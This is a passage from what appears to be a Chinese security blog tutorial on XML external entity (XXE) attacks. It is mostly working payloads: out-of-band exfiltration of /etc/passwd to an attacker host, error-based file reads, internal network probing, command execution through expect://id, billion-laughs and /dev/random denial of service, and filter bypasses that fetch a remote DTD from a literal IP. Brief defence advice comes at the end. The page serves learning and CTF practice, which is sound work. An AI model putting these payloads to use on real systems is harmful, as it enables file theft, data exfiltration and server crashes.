+</blockquote>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+	&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;  
+	&lt;!ENTITY % start &quot;&lt;!ENTITY &#x25; send SYSTEM &#39;http:&#x2F;&#x2F;myip&#x2F;?%file;&#39;&gt;&quot;&gt;
+	%start;
+	%send;
+]&gt;
+&lt;message&gt;10&lt;&#x2F;message&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>基于报错的三层嵌套参数实体XXE</p>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+	&lt;!ELEMENT message ANY&gt;
+	&lt;!ENTITY % para1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
+	&lt;!ENTITY % para &#39;
+		&lt;!ENTITY &#x25; para2 &quot;&lt;!ENTITY &#x26;#x25; error SYSTEM &#x27;file:&#x2F;&#x2F;&#x2F;&#x25;para1;&#x27;&gt;&quot;&gt;
+		&#x25;para2;
+	&#39;&gt;
+	%para;
+]&gt;
+&lt;message&gt;10&lt;&#x2F;message&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="内网探测"><a class="markdownIt-Anchor" href="#内网探测"></a> 内网探测</h3>
+<p>只是把URL改成内网机器的地址</p>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;        
+&lt;!DOCTYPE foo [ 
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY rabbit SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;1.txt&quot; &gt;
+]&gt;
+&lt;user&gt;&lt;firstname&gt;&rabbit;&lt;&#x2F;firstname&gt;&lt;lastname&gt;666&lt;&#x2F;lastname&gt;&lt;&#x2F;user&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="rce"><a class="markdownIt-Anchor" href="#rce"></a> RCE</h3>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行 - FreeBuf网络安全行业门户</a></p>
+<p>这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：</p>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;id&quot; &gt;]&gt;
+&lt;catalog&gt;
+   &lt;core id&#x3D;&quot;test101&quot;&gt;
+      &lt;author&gt;John, Doe&lt;&#x2F;author&gt;
+      &lt;title&gt;I love XML&lt;&#x2F;title&gt;
+      &lt;category&gt;Computers&lt;&#x2F;category&gt;
+      &lt;price&gt;9.99&lt;&#x2F;price&gt;
+      &lt;date&gt;2018-10-01&lt;&#x2F;date&gt;
+      &lt;description&gt;&xxe;&lt;&#x2F;description&gt;
+   &lt;&#x2F;core&gt;
+&lt;&#x2F;catalog&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>响应</p>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&#123;&quot;error&quot;: &quot;no results for description uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="dos"><a class="markdownIt-Anchor" href="#dos"></a> DOS</h2>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol &quot;lol&quot;&gt;
+  &lt;!ENTITY lol2 &quot;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&quot;&gt;
+  &lt;!ENTITY lol3 &quot;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&quot;&gt;
+  &lt;!ENTITY lol4 &quot;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&quot;&gt;
+  &lt;!ENTITY lol5 &quot;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&quot;&gt;
+  &lt;!ENTITY lol6 &quot;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&quot;&gt;
+  &lt;!ENTITY lol7 &quot;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&quot;&gt;
+  &lt;!ENTITY lol8 &quot;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&quot;&gt;
+  &lt;!ENTITY lol9 &quot;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&quot;&gt;
+]&gt;
+&lt;lolz&gt;&lol9;&lt;&#x2F;lolz&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br />
+亦或者，如果目标是UNIX系统</p>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [ 
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;dev&#x2F;random&quot; &gt;]&gt;
+&lt;foo&gt;&xxe;&lt;&#x2F;foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果 XML 解析器尝试使用<code>/dev/random</code>文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p>
+<h2 id="绕过姿势"><a class="markdownIt-Anchor" href="#绕过姿势"></a> 绕过姿势</h2>
+<h3 id="entitysystemfile等关键词被过滤"><a class="markdownIt-Anchor" href="#entitysystemfile等关键词被过滤"></a> <code>ENTITY``SYSTEM``file</code>等关键词被过滤</h3>
+<p>使用编码方式绕过：UTF-16BE<br />
+<code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</code></p>
+<h3 id="http被过滤"><a class="markdownIt-Anchor" href="#http被过滤"></a> http被过滤</h3>
+<h4 id="data协议绕过"><a class="markdownIt-Anchor" href="#data协议绕过"></a> data://协议绕过</h4>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE test [
+    &lt;!ENTITY % a &quot; &lt;!ENTITY %  b SYSTEM &#39;http:&#x2F;&#x2F;118.25.14.40:8200&#x2F;hack.dtd&#39;&gt; &quot;&gt; 
+    %a;
+    %b;
+]&gt;
+&lt;test&gt;&hhh;&lt;&#x2F;test&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="file协议加文件上传"><a class="markdownIt-Anchor" href="#file协议加文件上传"></a> file://协议加文件上传</h4>
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE test [
+    &lt;!ENTITY % a SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;uploads&#x2F;cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;
+    %a;
+]&gt;
+&lt;!--上传文件--&gt;
+&lt;!ENTITY % b SYSTEM &#39;http:&#x2F;&#x2F;118.25.14.40:8200&#x2F;hack.dtd&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="phpfilter协议加文件上传"><a class="markdownIt-Anchor" href="#phpfilter协议加文件上传"></a> php://filter协议加文件上传</h4>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" ?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">
+    &lt;!ENTITY % a SYSTEM "php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg">
+    %a;
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span>
+        <span class="token entity named-entity" title="&hhh;">&amp;hhh;</span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span>
+
+<span class="token comment">&lt;!--上传文件--></span>
+&lt;!ENTITY hhh SYSTEM 'php://filter/read=convert.base64-encode/resource=./flag.php'><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" ?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">
+    &lt;!ENTITY % a SYSTEM "php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg">
+    %a;
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span>
+        <span class="token entity named-entity" title="&hhh;">&amp;hhh;</span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!--上传文件--></span>
+PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="利用场景"><a class="markdownIt-Anchor" href="#利用场景"></a> 利用场景</h3>
+<h2 id="svg"><a class="markdownIt-Anchor" href="#svg"></a> svg</h2>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>tips:从当前文件夹读取文件可以使用<code>/proc/self/cwd</code></p>
+<h2 id="excel"><a class="markdownIt-Anchor" href="#excel"></a> excel</h2>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3741">利用EXCEL进行XXE攻击</a><br />
+首先用excel创建一个空白的xlsx，然后解压</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> XXE <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> XXE
+<span class="token function">unzip</span> <span class="token punctuation">..</span>/XXE.xlsx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>将<code>[Content_Types].xml</code>改成恶意xml，再压缩回去</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> <span class="token parameter variable">-r</span> <span class="token punctuation">..</span>/poc.xlsx *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h2>
+<ul>
+<li>方案一、使用开发语言提供的禁用外部实体的方法<br />
+PHP：libxml_disable_entity_loader(true);<br />
+其他语言:<a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></li>
+<li>方案二、过滤用户提交的XML数据<br />
+关键词：<code>，</code>,<code>SYSTEM</code>和<code>PUBLIC</code>。</li>
+</ul>
+</div></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/" rel="prev" title="初识sql注入"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">初识sql注入</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/07/03/%E5%88%9D%E8%AF%86XSS/" rel="next" title="初识XSS"><span class="post-nav-text">初识XSS</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>您需要科学上网，才可使用评论区功能。</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/07/03/%E5%88%9D%E8%AF%86XXE/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank"></a></div><div class="copyright"><span>&copy; 2022 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Npc</span></div><div class="footer-custom-text">=w=</div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
